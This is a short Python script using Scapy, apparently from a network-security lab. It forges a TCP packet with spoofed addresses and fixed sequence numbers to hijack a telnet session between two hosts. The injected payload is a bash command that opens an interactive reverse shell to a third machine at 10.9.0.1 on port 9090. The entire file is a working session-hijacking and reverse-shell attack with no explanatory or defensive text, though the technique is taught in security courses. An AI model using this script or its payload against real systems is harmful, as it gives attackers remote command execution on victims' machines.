from scapy.all import *

ip=IP(src='10.9.0.5',dst='10.9.0.6')
tcp=TCP(sport=43414,dport=23,flags='A',seq=1895045313,ack=3264741626)
data='/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n\0'
pkt=ip/tcp/data
ls(pkt)
send(pkt, verbose = 0)
	
